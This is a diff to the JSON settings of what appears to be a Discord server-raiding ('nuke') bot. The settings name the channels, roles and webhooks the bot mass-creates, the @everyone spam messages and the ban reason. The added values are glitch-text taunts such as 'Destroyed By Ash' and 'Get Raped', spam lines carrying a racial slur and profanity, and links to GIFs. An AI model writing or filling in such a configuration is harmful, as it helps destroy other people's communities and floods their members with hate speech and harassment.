@@ -1,8 +1,8 @@
 {
- "prefix" : "$",
- "channel_names" : ["Axes Are Cool", "Axes Runs Cord", "Axes On Top", "Axes On Fire"],
- "roles_name" : ["Axes Are Cool", "Axes Runs Cord", "Axes On Top", "Axes On Fire"],
- "webhooknames" : ["Fucked By TheAxes", "Siezed By TheAxes"],
- "spam_text" : ["@everyone Axes Are Cool", "@everyone Axes Runs Cord", "@everyone Axes On Top", "@everyone Axes On Fire"],
- "reason" : "Seized By TheAxes"
+ "prefix" : ".",
+ "channel_names" : ["Ď͚͞e̢̞ͫ̕͟ͅst̨͓͇͍̣̀̐͌͂ͭ́r̻͈̩͍̙̳̥̩͕̺̦͕̋ͮͣ̓ͯ̈́ͯ͑ͫ͘͝o̬̹͙͔̩̎ͧ̈̎ͭ̕͘ͅ_̬ͥ̓͟͝y̶̵̢̗̣̖͉̜ͣ͛̇ͫͧ̈̐͜ę̵̫̘͍͍̫̲̿̑ͮͨͣͫͤ̐ͨͨ̒͂̂̊d̸̡̡̧̳͎̱̻͉̜̈́ͦ̾ͯͭ̚͝ B̴͍̮̑̑͛ͯ͛y̶̷̷͇̝͔̫̹͓͕͕ͭͥ͗̀ͪ̔͛͐̾̆ A̼͒s̵̵͎̲͎̓̅ͬ̀́̚͞͠h̢͓̓̆", "Ģ̷̧̩̤̭̝̰̃̆̃̄͢͝͠et̷̴͖̖̲͔̖̒̽͂ͤ͌ R̳̱̻̟̝͚̜̺̽ͣͮ̀͝a̧̝̹̼͈̝ͫͫ̾ͬ̿ͯ͐̆ͭ̃͂͡p͔̳̠̫͗̆ͩ̇̉ͪ̎̎̊͜͝e͔͔̾̐ͬͯ͌͘d̵͍ͣͮ̕͘͡͝", "D͖̙͕̔͡e̼a̲̦͌̓͊̏͋͟d̢̟̬͖̬͕͕̹̥̾̋ͯ͠ Ş͎̽ͯ͛͋͗́͐ͦ͑͠͞e̺ͣ́͆_̷̨̢̠ͤ̓ͬͫ̃ͤ_̶͂̚r̰̺̘̬̅͒̒ͪ̕̚ͅv̶̔̀ę̵̜̫̗̤̊͂̄ͪ́͊̇̔̚̕ȑ͈͉̬͕̬ͮͮ͘͞"],
+ "roles_name" : ["Ģ̵͚̺̗͍̟ͮ̃͌̕͜ě̢͇̫͎̬ͬ̇ͬ͑͗́̂͌̏ͧ̉͋ͦ̅̕ͅt̶̝͕̞͙̼̹̖̂̔̓̇̓̅͢ R̷͍̠̤̺̳͙͝_̻̱̠͉͂͛ͨ͆̽̌͞ḁ̡̲̊͞i̝͜d̵̛̖͚̟̅͆̂̂̀́̀̄͜͞͡͠ͅe̴͔̪͋̋ͬͬ͘͠d̢̛̰̭͖͎ͫ͗͆ͭ͂ͮ͘͠͡͞͞", "O̵̶̗̦̜̙͕̣̓ͭ̌̉ͬ͂ͩ͞ͅ_ͬ͠wn̡̡̥̭̏̉̈́̿̅͊̑̈͗ͯ̚͘͘̕͞͡e̹͉͈͓̰̦ͦ̀̌ͣͦ̀ŕ̶͍̓́̀ͬ I̖s̤ Ă̯͓͛ F̪̍͆͋ͧ̌a̛̜̠̯̟̗ͥ͋̾ͦ͘͘͘͘͜͟g̸̨͖͇͗ͩͨ̊̉̔̀̌̀͘gơ̢̧̗̬̹͕̍ͯͥͩ̔ͣ̍ͬͯͭ͋t͇̗̩̝͔̍ͩ͆͟ͅ", "B͙̮̣ͬ̇ͩ̂͋̆͌́͂͜é̶̪̫̝̤̟̬̪͗̐ͣ͌͐̚ą͖͉̥̳͓̘͂ͮ͑̊̀ͭ̔͛͟͜͞_̙̏̚m̧̛ͫ̑ͨ͡e̛̠̹̪̩̟͎̙̩̱̟͚ͤ́̀̍́͘͘d̰̰̤", "N͋ͥͭ̑̐_͛ͮ́ǐ̷̴̶̧͙̹͓̳̯̱̪ͦ̌̑ͥͯͮ́̕̕g̶͎͖̗͙̬̀ͫ̿̈́g̷̸̦̣͕̬̤ͣͫͥ̓ͬ͆͂̕͜͢͟e̸̞͉̥̻̯̲̙̣̓̑̋̐ͦ͟r̸̨̛̖̹̻̮̠͇̪͖̅ͣ̿́́ͩͬ̈̆͠͠"],
+ "webhooknames" : ["L̡̩͈̮̑͒͌͋̉̐͌͒ͤ̐̌͘̕ȍ̝̲ͯ̕c̠̻̞̲̻̙͈̯͐̽̽ͭ̕͢a̟̾l̵̡̢̙̫̰͉̯͗͌̊ͫ̑͘̕͟͡ D̢̕_͇͈ͯ͡u̥͚ͧ͐͜m̔b͕̒͌ͫ̌ͤa̶̧̢͕͚̬͔̅͑̈͆ͭ̄͒ͥ̕͢ͅs̷͓̞̀̒͡s̶̴̱̼͈͗ͥ́̿̾̍͟", "Lͪ̄X̴̨̛̗̟̗̱̘̰͑̎̈̈́̈̅ͦ̂͛́̎͘͡M̨̛̱͍̞̥͈̯͐ͭ̌ͮ̀ͫ̀͘Ö̠͚́̀ͭ̉"],
+ "spam_text" :["@everyone https://tenor.com/view/mgk-lace-up-gif-23856532", "@everyone Get Nuked Nigger", "@everyone Boom! Get Nuked", "@everyone Messed With The Wrong Fucks", "@everyone Beamed", "@everyone Get Fucked", "@everyone Axes are cool", "@everyone consider this place a shithole", "@everyone https://media.discordapp.net/attachments/1203032425719013456/1203045432138145932/yippy.gif?ex=69da93de&is=69d9425e&hm=5ebe2a4848d360da6c8a3d88fb6941ed97a15d46bf64d0d2dc24fd1a9f820cfc&", "@everyone https://cdn.discordapp.com/attachments/1471556452484120868/1484606637737119965/bleedIMG82xJ5zBlj70w5.gif?ex=69da86ad&is=69d9352d&hm=65949f6a35562af7a1ef5cc53e3dcad4d078cc15c8969f11ee55935bfafabdf5", "@everyone https://media.discordapp.net/attachments/868243457897025556/1013546159635173396/image0-1-2.gif?ex=69daaf6b&is=69d95deb&hm=7abbeff56fc9cee640991264f5fb8c7a5af8bb1a5a301c2df641c31a7930e447&"],
+ "reason" : "Ģ̗͚͖̪̱̇ͬͨͦ̆͂ͯ͋͘̚͞ͅe̵̡̤̳̪͓̖͎̥̔͒̒̿̋͊Ṫ̶̶̖͎͔̹̘̥̦̩̣̗̃ͮ̏̌͘͘ F̵̧̟̮̽̒̌͒̚ư̢͍̱̼͉̰͇̲ͦͧͧ̋̈́͝C̨̧̹̞̦̻͙̜̄ͬ̌ͦͧͤ͋ͤ͢͝k̖̞̹̯͔͉͒͒̐̆ͤ͒̆̕Ę̥͚͕͇̬̈́ͤ̊ͭ̅͛͐ͫ̊͘ͅd̢̛̫̦̮̞͔̻̥̼̺̮͊͑͐̽̀̊̋͝"
  } 
